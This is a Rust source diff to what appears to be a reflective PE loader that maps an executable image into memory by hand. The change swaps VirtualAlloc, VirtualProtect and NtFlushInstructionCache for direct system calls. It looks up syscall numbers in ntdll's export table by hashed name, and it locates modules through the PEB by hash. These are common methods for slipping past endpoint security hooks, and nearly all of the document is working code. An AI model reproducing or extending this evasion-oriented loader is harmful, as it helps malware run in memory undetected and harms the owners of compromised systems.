@@ -6,35 +6,29 @@
 mod error;
 mod helpers;
 mod structures;
+mod syscall;
 
 use crate::{
 	error::{Error, Result},
 	helpers::{
-		find_export_by_ascii, find_export_by_hash, find_loaded_module_by_ascii,
-		find_loaded_module_by_hash, find_pe, fnv1a_hash_32, fnv1a_hash_32_wstr, simple_memcpy,
+		find_export_by_ascii, find_export_by_hash, find_loaded_module_by_hash, find_pe,
+		find_syscall_by_hash, fnv1a_hash_32, fnv1a_hash_32_wstr, get_library_base, simple_memcpy,
+		syscall_table,
 	},
 	structures::PeHeaders,
+	syscall::{syscall3, syscall5, syscall6},
 };
 use core::{
 	arch::asm,
-	ffi::c_void,
 	mem::{size_of, transmute},
-	ptr::{null, null_mut},
+	ptr::null_mut,
 	slice,
 	str::from_utf8_unchecked,
 };
 use cstr_core::CStr;
-use helpers::syscall_table;
 use ntapi::{
 	ntpebteb::TEB,
-	ntpsapi::PEB_LDR_DATA,
-	winapi::{
-		shared::{
-			basetsd::SIZE_T,
-			ntdef::{HANDLE, NTSTATUS, PVOID},
-		},
-		um::winnt::{DLL_PROCESS_ATTACH, PAGE_NOACCESS},
-	},
+	winapi::um::winnt::{DLL_PROCESS_ATTACH, PAGE_NOACCESS},
 };
 use object::{
 	pe::{
@@ -49,11 +43,10 @@ use wchar::wch;
 use windows_sys::{
 	core::PCSTR,
 	Win32::{
-		Foundation::{BOOL, HINSTANCE},
+		Foundation::{HINSTANCE, STATUS_SUCCESS},
 		System::Memory::{
 			MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE,
-			PAGE_EXECUTE_WRITECOPY, PAGE_PROTECTION_FLAGS, PAGE_READONLY, PAGE_READWRITE,
-			PAGE_WRITECOPY, VIRTUAL_ALLOCATION_TYPE,
+			PAGE_EXECUTE_WRITECOPY, PAGE_READONLY, PAGE_READWRITE, PAGE_WRITECOPY,
 		},
 	},
 };
@@ -61,33 +54,13 @@ use windows_sys::{
 const KERNEL32_HASH: u32 = fnv1a_hash_32_wstr(wch!("KERNEL32.DLL"));
 const NTDLL_HASH: u32 = fnv1a_hash_32_wstr(wch!("ntdll.dll"));
 
-const VIRTUALALLOC_HASH: u32 = fnv1a_hash_32("VirtualAlloc".as_bytes());
-const LOADLIBRARYA_HASH: u32 = fnv1a_hash_32("LoadLibraryA".as_bytes());
-const NTFLUSHINSTRUCTIONCACHE_HASH: u32 = fnv1a_hash_32("NtFlushInstructionCache".as_bytes());
-const VIRTUALPROTECT: u32 = fnv1a_hash_32("VirtualProtect".as_bytes());
+// const LDRLOADDLL_HASH: u32 = fnv1a_hash_32("LdrLoadDll".as_bytes());
 
-#[inline(never)]
-pub fn get_library_base(
-	peb_ldr: &PEB_LDR_DATA,
-	library_name: *const u8,
-	loadlibrarya: unsafe extern "system" fn(*const u8) -> isize,
-) -> Result<*mut u8> {
-	let loaded_library_base = match find_loaded_module_by_ascii(peb_ldr, library_name as _) {
-		Ok(base) => base,
-		Err(_) => {
-			// Call loadlibrarya and then try find it again
-			let module_handle = unsafe { loadlibrarya(library_name) as *mut u8 };
-			if module_handle.is_null() {
-				return Err(Error::LoadLibrary);
-			}
-			find_loaded_module_by_ascii(peb_ldr, library_name as _)?
-		}
-	};
-	if loaded_library_base.is_null() {
-		return Err(Error::LoadLibrary);
-	}
-	Ok(loaded_library_base)
-}
+const ZWFLUSHINSTRUCTIONCACHE_HASH: u32 = fnv1a_hash_32("ZwFlushInstructionCache".as_bytes());
+const ZWALLOCATEVIRTUALMEMORY_HASH: u32 = fnv1a_hash_32("ZwAllocateVirtualMemory".as_bytes());
+const ZWPROTECTVIRTUALMEMORY_HASH: u32 = fnv1a_hash_32("ZwProtectVirtualMemory".as_bytes());
+
+const LOADLIBRARYA_HASH: u32 = fnv1a_hash_32("LoadLibraryA".as_bytes());
 
 #[inline(never)]
 fn load() -> Result<(*mut u8, *mut u8)> {
@@ -109,52 +82,31 @@ fn load() -> Result<(*mut u8, *mut u8)> {
 
 	let peb_ldr = unsafe { &*peb.Ldr };
 
-	// Traverse loaded modules to find kernel32.dll and ntdll.dll
+	// Traverse loaded modules to find ntdll.dll
 	let ntdll_base = find_loaded_module_by_hash(peb_ldr, NTDLL_HASH)?;
 	let ntdll = PeHeaders::parse(ntdll_base)?;
 
 	// Locate the export table for ntdll.dll
 	let ntdll_export_table = ntdll.export_table_mem(ntdll_base)?;
 
-	// let syscall_table = syscall_table(&ntdll_export_table, ntdll_base);
+	// Locate some functions
+	// let ldr_load_dll = find_export_by_hash(&ntdll_export_table, ntdll_base, LDRLOADDLL_HASH)?;
 
-	// Find the required function locations in ntdll.dll
-	let ntflushinstructioncache = find_export_by_hash(
-		&ntdll_export_table,
-		ntdll_base,
-		NTFLUSHINSTRUCTIONCACHE_HASH,
-	)?;
-	let ntflushinstructioncache = unsafe {
-		transmute::<
-			_,
-			unsafe extern "system" fn(
-				ProcessHandle: HANDLE,
-				BaseAddress: PVOID,
-				Length: SIZE_T,
-			) -> NTSTATUS,
-		>(ntflushinstructioncache)
-	};
+	let syscall_table = syscall_table(&ntdll_export_table, ntdll_base);
 
+	let sys_no_zwflushinstructioncache =
+		find_syscall_by_hash(&syscall_table, ZWFLUSHINSTRUCTIONCACHE_HASH)?;
+	let sys_no_zwallocatevirtualmemory =
+		find_syscall_by_hash(&syscall_table, ZWALLOCATEVIRTUALMEMORY_HASH)?;
+	let sys_no_zwprotectvirtualmemory =
+		find_syscall_by_hash(&syscall_table, ZWPROTECTVIRTUALMEMORY_HASH)?;
+
+	// Traverse loaded modules to find kernel32.dll
 	let kernel32_base = find_loaded_module_by_hash(peb_ldr, KERNEL32_HASH)?;
 	let kernel32 = PeHeaders::parse(kernel32_base)?;
 
-	// Locate the export table for kernel32.dll
+	// Locate the export table for ntdll.dll
 	let kernel32_export_table = kernel32.export_table_mem(kernel32_base)?;
-
-	// Find the required function locations in kernel32.dll
-	let virtualalloc =
-		find_export_by_hash(&kernel32_export_table, kernel32_base, VIRTUALALLOC_HASH)?;
-	let virtualalloc = unsafe {
-		transmute::<
-			_,
-			unsafe extern "system" fn(
-				lpaddress: *const c_void,
-				dwsize: usize,
-				flallocationtype: VIRTUAL_ALLOCATION_TYPE,
-				flprotect: PAGE_PROTECTION_FLAGS,
-			) -> *mut c_void,
-		>(virtualalloc)
-	};
 
 	let loadlibararya =
 		find_export_by_hash(&kernel32_export_table, kernel32_base, LOADLIBRARYA_HASH)?;
@@ -162,38 +114,33 @@ fn load() -> Result<(*mut u8, *mut u8)> {
 		transmute::<_, unsafe extern "system" fn(lplibfilename: PCSTR) -> HINSTANCE>(loadlibararya)
 	};
 
-	let virtualprotect =
-		find_export_by_hash(&kernel32_export_table, kernel32_base, VIRTUALPROTECT)?;
-	let virtualprotect = unsafe {
-		transmute::<
-			_,
-			unsafe extern "system" fn(
-				lpaddress: *const c_void,
-				dwsize: usize,
-				flnewprotect: PAGE_PROTECTION_FLAGS,
-				lpfloldprotect: *mut PAGE_PROTECTION_FLAGS,
-			) -> BOOL,
-		>(virtualprotect)
-	};
-
 	// Allocate space to map the PE into
 	let size_of_image = pe
 		.nt_header
 		.optional_header()
 		.size_of_image
-		.get(LittleEndian) as _;
+		.get(LittleEndian) as usize;
 
-	let allocated_ptr = unsafe {
-		virtualalloc(
-			null(),
-			size_of_image,
-			MEM_RESERVE | MEM_COMMIT,
-			PAGE_READWRITE,
+	let mut allocated_ptr = null_mut::<u8>();
+	let mut region_size = size_of_image as usize;
+
+	let nt_status = unsafe {
+		syscall6(
+			sys_no_zwallocatevirtualmemory,
+			-1i64 as _,
+			&mut allocated_ptr as *mut _ as _,
+			0,
+			&mut region_size as *mut _ as _,
+			(MEM_RESERVE | MEM_COMMIT) as _,
+			PAGE_READWRITE as _,
 		)
+	};
+	if nt_status != STATUS_SUCCESS as _ {
+		return Err(Error::Allocation);
 	}
-	.cast::<u8>();
+
 	if allocated_ptr.is_null() {
-		return Err(Error::VirtualAlloc);
+		return Err(Error::Allocation);
 	}
 
 	// Copy over header data
@@ -425,21 +372,28 @@ fn load() -> Result<(*mut u8, *mut u8)> {
 	}
 
 	// Set header permissions
-	let mut old_permissions = Default::default();
-	unsafe {
-		virtualprotect(
-			allocated_ptr as _,
-			header_size,
-			PAGE_READONLY,
-			&mut old_permissions,
+	let base_address = allocated_ptr;
+	let mut region_size = header_size;
+	let mut old_permissions = u32::default();
+	let nt_status = unsafe {
+		syscall5(
+			sys_no_zwprotectvirtualmemory,
+			-1i64 as _,
+			&base_address as *const _ as _,
+			&mut region_size as *mut _ as _,
+			PAGE_READONLY as _,
+			&mut old_permissions as *mut _ as _,
 		)
 	};
+	if nt_status != STATUS_SUCCESS as _ {
+		return Err(Error::Protect);
+	}
 
 	// Set section permissions
-	pe.section_headers.iter().for_each(|section| {
+	pe.section_headers.iter().try_for_each(|section| {
 		let virtual_address =
 			unsafe { allocated_ptr.add(section.virtual_address.get(LittleEndian) as _) };
-		let virtual_size = section.virtual_size.get(LittleEndian) as _;
+		let virtual_size = section.virtual_size.get(LittleEndian);
 
 		// Change permissions
 		let characteristics = section.characteristics.get(LittleEndian);
@@ -456,16 +410,24 @@ fn load() -> Result<(*mut u8, *mut u8)> {
 			(false, true, true) => PAGE_EXECUTE_WRITECOPY,
 			(true, true, true) => PAGE_EXECUTE_READWRITE,
 		};
-		let mut old_permissions = Default::default();
-		unsafe {
-			virtualprotect(
-				virtual_address as _,
-				virtual_size,
-				new_permissions,
-				&mut old_permissions,
+		let base_address = virtual_address;
+		let mut region_size = virtual_size;
+		let mut old_permissions = u32::default();
+		let nt_status = unsafe {
+			syscall5(
+				sys_no_zwprotectvirtualmemory,
+				-1i64 as _,
+				&base_address as *const _ as _,
+				&mut region_size as *mut _ as _,
+				new_permissions as _,
+				&mut old_permissions as *mut _ as _,
 			)
 		};
-	});
+		if nt_status != STATUS_SUCCESS as _ {
+			return Err(Error::Protect);
+		}
+		Ok(())
+	})?;
 
 	let entry_point = unsafe {
 		allocated_ptr.add(
@@ -477,7 +439,11 @@ fn load() -> Result<(*mut u8, *mut u8)> {
 	};
 
 	// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing
-	unsafe { ntflushinstructioncache(-1 as _, null_mut(), 0) };
+	let nt_status = unsafe { syscall3(sys_no_zwflushinstructioncache, -1i64 as _, 0, 0) };
+	if nt_status != STATUS_SUCCESS as _ {
+		return Err(Error::Flush);
+	}
+	// unsafe { ntflushinstructioncache(-1 as _, null_mut(), 0) };
 
 	Ok((allocated_ptr, entry_point))
 }
